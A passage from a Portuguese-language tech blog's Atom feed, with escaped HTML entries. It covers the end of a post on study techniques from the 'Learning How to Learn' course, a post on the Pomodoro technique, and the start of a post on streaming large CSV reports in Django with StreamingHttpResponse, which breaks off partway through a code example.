pratique exercícios, caminhe e quebre a rotina.&lt;/p&gt;
&lt;p&gt;E não subestime os "eurekas" durante o banho.&lt;/p&gt;
&lt;h2&gt;Tenha a sensação de progresso&lt;/h2&gt;
&lt;p&gt;Você não sobe numa esteira sem saber quantos quilômetros ou minutos
vai ficar correndo nela, certo? (Certo?)&lt;/p&gt;
&lt;p&gt;Seu cérebro sente-se premiado com a sensação reconfortante do progresso.
E embora exista o risco de cair nas armadilhas dos dois primeiros tópicos,
entender onde você quer chegar e saber o quanto você já caminhou é fundamental
para se manter motivado.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A dica é:&lt;/strong&gt; Pense de onde você veio e aonde quer chegar estudando determinado
assunto. "Trackeie" o seu progresso. Faça as coisas mais difíceis primeiro, a realização
delas te dará motivação para seguir em frente.&lt;/p&gt;
&lt;p&gt;Ter a sensação de progresso é um fator motivante. Não o subestime.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Eu recorri ao curso após falhar duas vezes seguidas nos testes de uma determinada
especialização do &lt;em&gt;Coursera&lt;/em&gt;. É bem verdade que algumas das técnicas acima
são bem conhecidas, mas eu nunca tive a noção do quanto elas (através de uma
forma pragmática) podem auxiliar no processo de aprendizagem de diferentes assuntos.&lt;/p&gt;
&lt;p&gt;Inclusive, esse artigo faz parte do meu processo de &lt;a href="http://noticias.universia.pt/ciencia-tecnologia/especial/2014/01/14/1074898/1/portugues-recebe-2-milhes-euros-investigar-mecanismos-memoria/consiste-chunking.html" title="Em que é que consiste o Chunking?"&gt;chunking&lt;/a&gt;
apresentado pelo próprio "Aprendendo a Aprender". É algo que costumo fazer com
frequência: Ao aprender um conteúdo novo, eu escrevo sobre e compartilho. Isso
me motiva a fazer uma pesquisa maior e me faz relembrar conceitos, "fixando" melhor o assunto.&lt;/p&gt;
&lt;p&gt;Vários pontos importantes não foram abordados nesse &lt;em&gt;post&lt;/em&gt; (como construção de
redes neurais, diferença de memória de curto e longo prazo, como fazer &lt;em&gt;chunking&lt;/em&gt;,
aspectos visuais da memória e como tirar proveito disso, palácio das memórias, etc),
portanto saliento uma vez mais: &lt;a href="https://pt.coursera.org/learn/aprender" title="Aprendendo a Aprender"&gt;Não deixe de conferir o curso no &lt;em&gt;Cousera&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Aproveite também para conferir o &lt;a href="https://medium.com/@princessmiwi/um-resumo-do-curso-aprendendo-a-aprender-de-barbara-oakley-8d7253f51d21" title="Um Resumo do Curso “Aprendendo a Aprender”, de Barbara Oakley"&gt;bom artigo&lt;/a&gt; da &lt;em&gt;Cindy Dalfovo&lt;/em&gt; no &lt;em&gt;Medium&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Obs.: Não li o livro (de mesmo nome e autor), mas está bem avaliado na &lt;a href="https://www.amazon.com.br/Aprendendo-Aprender-Matem%C3%A1tica-Ci%C3%AAncias-Qualquer/dp/8586622451" title="Aprendendo a Aprender. Como Ter Sucesso em Matemática, Ciências e Qualquer Outra Matéria"&gt;&lt;em&gt;Amazon&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;#ficadica&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.abbc.org.br/cursos/artigo.asp?id=7"&gt;ABBC Educacional - Aprender a aprender: 10 regras para estudar bem&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@eu.alexandre/aprendizagem-espa%C3%A7ada-o-m%C3%A9todo-que-tem-causado-muita-pol%C3%AAmica-a93bcea8c8f0"&gt;Alexandre Afonso - Aprendizagem Espaçada… O Método Que Tem Causado Muita Polêmica&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.coursera.org/learn/aprender"&gt;Coursera - Aprendendo a Aprender&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lifehacker.com/5946606/improve-your-memory-with-the-chunking-technique"&gt;Lifehacker - Improve Your Memory with The Chunking Technique&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mel-meow.com/uma-longa-noite-aprendendo/"&gt;mel-meow - Uma longa noite aprendendo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@princessmiwi/um-resumo-do-curso-aprendendo-a-aprender-de-barbara-oakley-8d7253f51d21"&gt;pricessmiwi - Um Resumo do Curso “Aprendendo a Aprender”, de Barbara Oakley&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://noticias.universia.pt/ciencia-tecnologia/especial/2014/01/14/1074898/1/portugues-recebe-2-milhes-euros-investigar-mecanismos-memoria/consiste-chunking.html"&gt;Universia - Em que é que consiste o Chunking?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="produtividade"></category><category term="estudos"></category><category term="carreira"></category><category term="cursos"></category></entry><entry><title>Pomodoro FTW!</title><link href="https://klauslaube.com.br/2017/06/29/pomodoro-ftw.html" rel="alternate"></link><published>2017-06-29T18:20:00-03:00</published><updated>2017-06-29T18:20:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-06-29:/2017/06/29/pomodoro-ftw.html</id><summary type="html">&lt;p&gt;Sim, meus amigos! O título poderia ser "esse é mais um post sobre Pomodoro Technique",
e embora haja toneladas de artigos na &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; sobre o assunto, me sinto na obrigação
de falar um pouquinho sobre ele aqui também. Afinal, além de ser uma prática simples e que
apresenta resultados, é …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sim, meus amigos! O título poderia ser "esse é mais um post sobre Pomodoro Technique",
e embora haja toneladas de artigos na &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; sobre o assunto, me sinto na obrigação
de falar um pouquinho sobre ele aqui também. Afinal, além de ser uma prática simples e que
apresenta resultados, é ela que tem salvo a produtividade das minhas tardes de &lt;em&gt;home office&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Então prepare o seu &lt;em&gt;timer&lt;/em&gt; e vamos entender como essa técnica funciona.&lt;/p&gt;
&lt;h2&gt;25 minutos focados, 5 minutos de descanso&lt;/h2&gt;
&lt;p&gt;E vamos lá no oráculo da produtividade para entender o que é o &lt;em&gt;Pomodoro Technique&lt;/em&gt;.
Segundo o &lt;a href="http://lifehacker.com/" title="Tips, tricks and downloads to get things done"&gt;&lt;em&gt;Lifehacker&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) is a cyclical system. You work in short sprints , which makes
sure you're consistently productive. You also get to take regular breaks
that bolster your motivation and keep you creative.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;É possível resumir a técnica inteira nos seguintes passos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Escolha &lt;strong&gt;uma tarefa&lt;/strong&gt; que você queira concluir&lt;/li&gt;
&lt;li&gt;Configure o seu &lt;em&gt;timer&lt;/em&gt; para &lt;strong&gt;25 minutos&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Trabalhe nessa tarefa até o &lt;em&gt;timer&lt;/em&gt; despertar&lt;/li&gt;
&lt;li&gt;Faça uma pausa de &lt;strong&gt;5 minutos&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Repita do início&lt;/li&gt;
&lt;li&gt;A cada 4 "sprints" de 25 minutos, faça uma &lt;strong&gt;pausa de 15 minutos&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Esse é basicamente o &lt;em&gt;framework&lt;/em&gt; da técnica, sendo que existem algumas premissas fundamentais:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;O ato de "trabalhar focado durante 25 minutos" é chamado de &lt;em&gt;Pomodoro&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;O ideal é que uma tarefa seja grande o suficiente para caber dentro de um &lt;em&gt;Pomodoro&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Embora não seja de senso comum, os tempos de trabalho focado e repouso podem ser adaptados. Por exemplo, eu costumo fazer pausas longas de 30 minutos ao invés de 15.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Durante cada &lt;em&gt;Pomodoro&lt;/em&gt;, feche o seu &lt;em&gt;Facebook&lt;/em&gt;, ignore o seu celular e foque completamente
no que precisa ser feito. Nos minutos de folga, usufrua de sua recompensa (redes sociais, &lt;em&gt;Youtube&lt;/em&gt;, uma passadinha no &lt;em&gt;9gag&lt;/em&gt; ou até mesmo aquele cafézinho).&lt;/p&gt;
&lt;h2&gt;Adestramento?&lt;/h2&gt;
&lt;p&gt;A técnica criada por &lt;a href="https://cirillocompany.de/" title="Work smarter, not harder"&gt;&lt;em&gt;Francesco Cirillo&lt;/em&gt;&lt;/a&gt; tem por objetivo te ajudar a melhorar
a concentração, evitar distrações e combater a procrastinação. E embora ela seja
amplamente recomendada, &lt;a href="https://productivityist.com/the-problem-with-the-pomodoro-technique/" title="The Problem with The Pomodoro Technique"&gt;não é vista com bons olhos por todo o mundo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/killer-tomatoes.png" width="640" height="440" title="Não é o Ataque dos Tomates Assassinos, mas vai te ajudar a matar a procrastinação (killertomatoes.com)" alt="Não é o Ataque dos Tomates Assassinos, mas vai te ajudar a matar a procrastinação (killertomatoes.com)"&gt;&lt;/p&gt;
&lt;p&gt;Eu mesmo não sigo à risca os passos acima. Geralmente recorro ao &lt;em&gt;Pomodoro&lt;/em&gt; quando
estou com dificuldades de concentração, ou quando preciso encarar uma tarefa que é
muito penosa de se executar. Segundo o "&lt;a href="https://pt.coursera.org/learn/aprender" title="Ferramentas mentais poderosas para ajudá-lo a dominar assuntos difíceis"&gt;Aprendendo a Aprender&lt;/a&gt;",
com auxílio da técnica você faz com que o seu cérebro foque na execução do processo ao invés de focar no resultado
da atividade (atingir os 25 minutos é muito mais palpável que finalizar aquele livro técnico
que você está levando meses para terminar e só está na página 13). Com isso, diminuímos aquela resistência natural de
"hoje não, vou deixar para amanhã" e driblamos a procrastinação.&lt;/p&gt;
&lt;p&gt;Outra coisa que eu não consigo fazer é quebrar as tarefas em tamanhos ideais para caberem
em um &lt;em&gt;Pomodoro&lt;/em&gt;. O que tem funcionado é gastar quantos &lt;em&gt;Pomodoros&lt;/em&gt; forem necessários
para mover uma &lt;em&gt;task&lt;/em&gt; de &lt;em&gt;DOING&lt;/em&gt; para &lt;em&gt;DONE&lt;/em&gt;. Além disso, se percebo que estou embalado no
raciocínio, negligencio algumas pausas e emendo os &lt;em&gt;sprints&lt;/em&gt; focados.&lt;/p&gt;
&lt;p&gt;Existe abertura para adaptação da técnica. Mas mesmo assim, ouço relatos de amigos e conhecidos
que tentaram usá-la e a acharam muito restritiva. Em alguns momentos ela chega a atrapalhar, é verdade,
mas na grande maioria das vezes foi a salvadora dos meus dias de &lt;em&gt;home office&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Ferramentas&lt;/h2&gt;
&lt;p&gt;O nome &lt;em&gt;Pomodoro&lt;/em&gt; vem do cronômetro gastronômico na forma de um tomate que
&lt;em&gt;Cirillo&lt;/em&gt; usava em suas sessões. E embora seja muito maneiro ter um &lt;em&gt;gadget&lt;/em&gt; desses
à disposição, qualquer cronômetro é o suficiente para praticar a técnica.&lt;/p&gt;
&lt;p&gt;Algumas fontes sugerem que "quanto menos tecnologia, melhor". Mas eu prefiro confiar no
&lt;a href="https://itunes.apple.com/us/app/tomato-one-free-focus-timer/id907364780?mt=12" title="Veja na App Store"&gt;&lt;em&gt;Tomato One&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://www.moosti.com/" title="Dê uma olhada na extensão para o Chrome"&gt;&lt;em&gt;Moosti&lt;/em&gt;&lt;/a&gt; ou no &lt;a href="https://play.google.com/store/apps/details?id=com.AT.PomodoroTimer&amp;amp;hl=pt_BR" title="Timer para o Android"&gt;&lt;em&gt;Brain Focus&lt;/em&gt;&lt;/a&gt;.
Ter uma noção de quantos &lt;em&gt;Pomodoros&lt;/em&gt; você está realizando te dará uma percepção melhor de progresso,
sendo possível averiguar se a técnica está funcionando ou não.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Sempre tive certo carinho por essa prática, principalmente após começar a trabalhar remoto. Ao contrário
do que muitos artigos vendem, ela não é uma técnica "bala de prata" e é provável que haja uma
grande resistência no início de sua adoção.&lt;/p&gt;
&lt;p&gt;Existem diferentes formas de "getting things done" e de dar &lt;em&gt;boost&lt;/em&gt; em sua concentração (você conhece o &lt;a href="https://www.noisli.com/" title="Improve focus and boost productivity"&gt;&lt;em&gt;Noisli&lt;/em&gt;&lt;/a&gt;?),
mas desconheço uma forma tão simples e pragmática quanto a Técnica &lt;em&gt;Pomodoro&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;(IMO) Vale a pena tê-la no seu &lt;em&gt;tool belt&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pt.coursera.org/learn/aprender"&gt;Coursera - Aprendendo a Aprender&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lifehacker.com/productivity-101-a-primer-to-the-pomodoro-technique-1598992730"&gt;Lifehacker - Productivity 101: A Primer to The Pomodoro Technique&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://productivityist.com/the-problem-with-the-pomodoro-technique/"&gt;Productivityist - The Problem with The Pomodoro Technique&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ramonkayo.com/ideias-e-opinioes/os-3-problemas-da-tecnica-pomodoro"&gt;ramonkayo.com - Os 3 maiores problemas da Técnica Pomodoro e como contorná-los&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikipedia.org/wiki/T%C3%A9cnica_pomodoro"&gt;Wikipedia - Técnica Pomodoro&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="produtividade"></category><category term="foco"></category><category term="home-office"></category><category term="pomodoro"></category></entry><entry><title>"Streamando" dados no Django</title><link href="https://klauslaube.com.br/2017/05/14/streaming-dados-django.html" rel="alternate"></link><published>2017-05-14T15:45:00-03:00</published><updated>2017-05-14T15:45:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-05-14:/2017/05/14/streaming-dados-django.html</id><summary type="html">&lt;p&gt;Recentemente na &lt;a href="http://loadsmart.com/" title="Book a truck with Loadsmart"&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt;,
houve a necessidade de lidar com um cenário onde se faz necessário acessar uma &lt;em&gt;view&lt;/em&gt;
que retorna um &lt;em&gt;CSV&lt;/em&gt; de tamanho considerável, gerado a partir de parâmetros dinâmicos,
no melhor esquema "imprima um relatório".&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Embora o &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; seja desenhado para requisições curtas, existe a possibilidade
de fazer …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Recentemente na &lt;a href="http://loadsmart.com/" title="Book a truck with Loadsmart"&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt;,
houve a necessidade de lidar com um cenário onde se faz necessário acessar uma &lt;em&gt;view&lt;/em&gt;
que retorna um &lt;em&gt;CSV&lt;/em&gt; de tamanho considerável, gerado a partir de parâmetros dinâmicos,
no melhor esquema "imprima um relatório".&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Embora o &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; seja desenhado para requisições curtas, existe a possibilidade
de fazer &lt;em&gt;streaming&lt;/em&gt; de grandes arquivos &lt;em&gt;CSVs&lt;/em&gt; através da classe &lt;code&gt;StreamingHttpResponse&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vale a nota: Esse artigo é sobre &lt;em&gt;CSVs&lt;/em&gt;, mas você também pode &lt;a href="http://stackoverflow.com/questions/30791228/serving-a-django-static-text-file" title="Serving a django static text file"&gt;"streamar" outros tipos de dados&lt;/a&gt;
através desse método supimpa.&lt;/p&gt;
&lt;h2&gt;Motivação&lt;/h2&gt;
&lt;p&gt;Em determinados cenários, precisamos retornar arquivos relativamente grandes para
o usuário. O exemplo acima, uma requisição com parâmetros que irão gerar um relatório
em &lt;em&gt;CSV&lt;/em&gt;, é um caso bem comum.&lt;/p&gt;
&lt;p&gt;O comportamento de resposta padrão do &lt;em&gt;Django&lt;/em&gt; é retornar uma instância de &lt;code&gt;HttpResponse&lt;/code&gt;.
O problema é que nesse modo carregaremos o arquivo inteiro para a memória do
servidor, e só depois enviamos o arquivo para o cliente. Além de prejudicarmos o &lt;em&gt;Time To
First Byte&lt;/em&gt; (TTBT), podemos gerar picos de memória na máquina hospedeira (que podem afetar
demais requisições sendo processadas) e &lt;em&gt;timeouts&lt;/em&gt; de conexão.&lt;/p&gt;
&lt;p&gt;Um exemplo de como faríamos esse retorno através do &lt;code&gt;HttpResponse&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;csv&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.http&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HttpResponse&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.view&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;View&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;CsvReportView&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;View&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;# Abstraindo a logica de filtro por parametros do request&lt;/span&gt;
        &lt;span class="n"&gt;cargoes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Cargoes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by_request_parms&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HttpResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Disposition&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;attachment; filename=&amp;quot;filtered_cargoes.csv&amp;quot;&amp;#39;&lt;/span&gt;

        &lt;span class="n"&gt;writer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;cargoes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;values_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;commodity&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;weight&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;writerow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se você tem certa intimidade com geradores, deve estar supondo que essa pode ser uma
maneira de solucionar esse problema... e você está certo!&lt;/p&gt;
&lt;h2&gt;Como funciona o StreamingHttpResponse?&lt;/h2&gt;
&lt;p&gt;O &lt;code&gt;StreamingHttpResponse&lt;/code&gt; funciona com a ajuda do conceito de &lt;em&gt;generators&lt;/em&gt;. Achei
uma excelente definição no &lt;a href="http://stackoverflow.com/questions/1756096/understanding-generators-in-python" title="Understanding Generators in Python"&gt;&lt;em&gt;Stackoverflow&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) is simply a function which returns an object on which you can
call next, such that for every call it returns some value, until it raises
a StopIteration exception, signaling that all values have been generated.
Such an object is called an iterator.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="https://www.slideshare.net/ramalho/iteraveis-e-geradores-em-python" title="Iteraveis e geradores em Python"&gt;Leia mais sobre iteráveis e geradores&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para tanto, o uso da palavra reservada &lt;code&gt;yield&lt;/code&gt; se faz necessário. Logo, ao invés de termos o exemplo abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;my_view&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello, there!&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;HttpResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Length&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Teremos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello,&amp;#39;&lt;/span&gt;
    &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;there!&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;my_view&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;StreamingHttpResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="https://andrewbrookins.com/django/how-does-djangos-streaminghttpresponse-work-exactly/" title="How does Django’s StreamingHttpResponse work, exactly"&gt;Leia mais no excelente "How does Django's StreamingHttpResponse work, exactly?"&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Voltando ao exemplo do &lt;em&gt;CSV&lt;/em&gt;, teremos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;csv&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.http&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;StreamingHttpResponse&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.views.generic&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;View&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Echo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Interface parecida com a que usamos para escrever arquivos.&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;CsvReportView&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;View&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;# Abstraindo a logica de filtro por parametros do request&lt;/span&gt;
